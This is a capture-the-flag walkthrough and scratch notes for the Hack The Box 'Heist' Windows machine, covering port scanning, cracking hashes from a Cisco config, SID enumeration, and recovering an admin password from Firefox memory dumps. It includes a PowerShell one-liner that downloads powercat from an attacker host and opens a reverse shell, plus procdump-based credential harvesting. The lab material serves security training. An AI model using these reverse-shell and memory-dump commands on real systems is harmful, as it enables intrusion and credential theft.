Heist - Windows machine from HTB

Initial port scanning against the target:

root@kali:~# nmap -v -p 1-65535 -sV -O -sS -T4 10.10.10.149

<img width="690" alt="1" src="https://user-images.githubusercontent.com/47299364/69317126-91160f80-0c3a-11ea-90f5-851907650dc8.png">

<img width="708" alt="2" src="https://user-images.githubusercontent.com/47299364/69317154-9d9a6800-0c3a-11ea-88b4-cf8d246a2e2e.png">

Cool, a webserver listening, let's check it out:

<img width="1395" alt="3" src="https://user-images.githubusercontent.com/47299364/69317197-b4d95580-0c3a-11ea-88fd-79cb5f6c1e2c.png">

Hum, login as guest? Let's go for it :)

<img width="1393" alt="4" src="https://user-images.githubusercontent.com/47299364/69317239-ca4e7f80-0c3a-11ea-9770-92c32c151f2a.png">

Sweet, even got a config file attached! Let's see the content:

<img width="615" alt="5" src="https://user-images.githubusercontent.com/47299364/69317268-ddf9e600-0c3a-11ea-9dd7-c485e2e54628.png">

Hum, interesting, Cisco config file. Well at least there are some user and hashes there. Let's crack them:

<img width="662" alt="6" src="https://user-images.githubusercontent.com/47299364/69317302-f7029700-0c3a-11ea-8cb6-82b17d0ef24f.png">
<img width="625" alt="7" src="https://user-images.githubusercontent.com/47299364/69317311-fe29a500-0c3a-11ea-8f4e-7ee7e0e82acd.png">

Ok so at this point we have two users and passwords that might be usefull later:

rout3r-$uperP@ssword  | 
admin-Q4)sJu\Y8qz*A3?d



powershell to download the script and execute it to get reverse shell:

powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.157/powercat/powercat.ps1');powercat -c 10.10.14.157 -p 9091 -e cmd"



notes:

rout3r-$uperP@ssword
admin-Q4)sJu\Y8qz*A3?d

chase:Q4)sJu\Y8qz*A3?d

hazard:stealth1agent	

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49668/tcp open  msrpc         Microsoft Windows RPC
					

Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

[*] Brute forcing SIDs at 10.10.10.149
[*] StringBinding ncacn_np:10.10.10.149[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-4254423774-1266059056-3197185112
500: SUPPORTDESK\Administrator (SidTypeUser)
501: SUPPORTDESK\Guest (SidTypeUser)
503: SUPPORTDESK\DefaultAccount (SidTypeUser)
504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
513: SUPPORTDESK\None (SidTypeGroup)
1008: SUPPORTDESK\Hazard (SidTypeUser)
1009: SUPPORTDESK\support (SidTypeUser)
1012: SUPPORTDESK\Chase (SidTypeUser)
1013: SUPPORTDESK\Jason (SidTypeUser)
root@kali:~# 



powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.157/powercat/powercat.ps1');powercat -c 10.10.14.157 -p 9091 -e cmd"


Get-ChildItem -Path . -Recurse -File | Select-String password	

powershell Invoke-WebRequest -Uri "http://10.10.14.157/Get-Strings.ps1" -OutFile "C:\Users\Chase\Downloads\Get-Strings.ps1"


powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.157/procdump.exe');procdump.exe firefox" 

    407      31    17476      63288       1.25      8   1 firefox                                  
    343      19    10128      37624       0.47   3728   1 firefox                                  
    358      25    16224      37592       0.56   5036   1 firefox                                  
    390      30    26268      58608      10.61   6340   1 firefox                                  
   1241      68   112720     186300      30.19   7120   1 firefox              	


Get-ChildItem . | Get-Strings.ps1 -Encoding Ascii

Get-ChildItem firefox.exe_191115_060945.dmp -Recurse | Select-String "Administrator"

select-string -path *.dmg -pattern "Administrator" -casesensitive

Get-Content *.dmp | Select-String -Pattern 'Chase'

Get-ChildItem firefox.exe_191115_065903.dmp -Recurse -File | Select-String "supportdesk"


-a----       11/15/2019   6:09 AM        2137972 firefox.exe_191115_060945.dmp                     
-a----       11/15/2019   6:59 AM      272852977 firefox.exe_191115_065903.dmp                     
-a----       11/15/2019   6:59 AM      286139199 firefox.exe_191115_065939.dmp                     
-a----       11/15/2019   6:59 AM      310417947 firefox.exe_191115_065956.dmp                     
-a----       11/15/2019   7:00 AM      479484595 firefox.exe_191115_070012.dmp  

admin@support.htb:4dD!5}x/re8]FBuZ

ReportsMOZ_C??/c???P?(?CTORY=C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Crash Repo
rts\eventsMOZ_CRASHREPORTER_PING_DIRECTORY=C:\Users\Chase\AppData\Roaming\Mozilla\Firefox\Pending 
PingsMOZ_CRASHREPORTER_RESTART_ARG_0=C:\Program Files\Mozilla Firefox\firefox.exeMOZ??/cG?
G?RG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBu
Z&login=MOZ_CRASHREPORTER_STRINGS_OVERRIDE=C:\Program Files\Mozilla Firefox\browser\crashreporter-
override.iniNUMBER_OF_PROCESSORS=4OS=Windows_NTPath=C:\Pro??/cP?(?indows\system3
2;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System
32\OpenSSH\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;;C:\Users\Chase\AppData\Loca
l\Microsoft\WindowsAppsPATHEXT=.COM??/c?-2??-2??-2? 
.2?.2?.2?@.2?0.2?P.2?`.2?p.2??.2??.2??.2?el 79 
Stepping 1, GenuineIntelPROCESSOR_LEVEL=6PROCESSOR_REVISION=4f01ProgramData=C:\ProgramDataProgr
amFiles=C:\Program FilesProgramFiles(x86)=C:\P??/c??,???,???,?C:\Program FilesPSM
odulePath=%ProgramFiles%\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modul
esPUBLIC=C:\Users\PublicSystemDrive=C:SystemRoot=C:\WindowsTEMP=C:\Users\Chase\AppData\Local\Te
mpTMP=C:\Users\Chase\??/cSoftwareAIN=SUPPORTDESKUSERNA??=c?(?`??(? 
??(?ewindir=C:\Wi=c?c?(?P?(?=1 ??;c?

